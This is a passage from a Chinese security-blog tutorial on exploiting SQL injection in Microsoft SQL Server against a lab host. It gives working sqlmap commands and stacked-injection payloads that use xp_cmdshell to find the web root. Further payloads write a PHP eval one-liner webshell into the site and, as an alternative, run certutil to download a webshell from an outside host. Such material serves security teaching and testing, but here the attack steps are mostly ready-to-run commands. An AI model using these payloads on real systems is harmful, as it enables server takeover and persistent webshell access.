    for /r c:\ %i in (test*.txt) do @echo %i   #这里的文件名后缀前那个点一定要加*号
    dir /s /b c:\test.txt

这里假设我们已经知道目标网站下有一个test.txt文件，

    
    
    创建表hack，并添加一个tmp的字段
    create table hack (tmp varchar(1000));--   

![](https://p2.ssl.qhimg.com/t01d04cf79b9a7eb061.png)

查看表是否创建成功

    
    
    python2 sqlmap.py -u http://192.168.10.20:88/index.php?id=1 -D test --tables

![](https://p5.ssl.qhimg.com/t01018119ca41d6a319.png)

    
    
    查找目标机器C盘下的test.txt路径，并将结果写入刚刚创建的hack表的tmp字段
    ;insert into hack(tmp) exec master..xp_cmdshell 'dir /s /b c:\test.txt';--    或
    ;insert into hack(tmp) exec master..xp_cmdshell 'for /r c:\ %i in (test*.txt) do @echo %i';--
以下两条语句均可

![](https://p3.ssl.qhimg.com/t014a0f321c944883d4.png)

![](https://p3.ssl.qhimg.com/t0177325a493c9fd4b8.png)

读取数据，得到目标网站绝对路径为：C:phpstudywww

    
    
    python2 sqlmap.py -u http://192.168.10.20:88/index.php?id=1 -D test -T hack --dump

![](https://p1.ssl.qhimg.com/t01dafcd05f2fc5f4e5.png)

将一句话木马写入目标网站根目录，并命名为shell.php。注意这里的一句话木马的 < 和 > 前要加上 ^

    
    
    1;exec master..xp_cmdshell 'echo ^<?php @eval($_POST[x]);?^> > C:\phpstudy\www\shell.php';--
![](https://p1.ssl.qhimg.com/t0114dd608aeb4a5433.png)

菜刀连接之

![](https://p0.ssl.qhimg.com/t01fbd568d1b67c56d0.png)

如果写入的木马文件连接不上的话，我们还可以通过下面手段使用 certutil 远程下载木马文件，前提是目标机器通公网。

    
    
    1;exec master..xp_cmdshell 'certutil -urlcache -split -f http://x.x.x.x/shell.php C:\phpstudy\www\shell2.php';--
![](https://p3.ssl.qhimg.com/t01804d3e01db5e56d8.png)

连接下载的shell2.php木马即可！

![](https://p1.ssl.qhimg.com/t018c23ed00513c6725.png)

## 还原备份数据库

鼠标右键数据库——>还原数据库

![](https://p4.ssl.qhimg.com/t01244f1ab5dfa141b3.png)

选择源设备，选择我们的备份数据库。然后目标数据库也选择该备份数据库，还原那里打上勾，点击确定即可。

![](https://p2.ssl.qhimg.com/t017bdbe256b43f49af.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **谢公子** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/200154](/post/id/200154)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SQLServer](/tag/SQLServer)

 **+1** __14赞

 __收藏

![](https://p4.ssl.qhimg.com/t01330ae7f74b7b9f2d.png) 谢公子

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

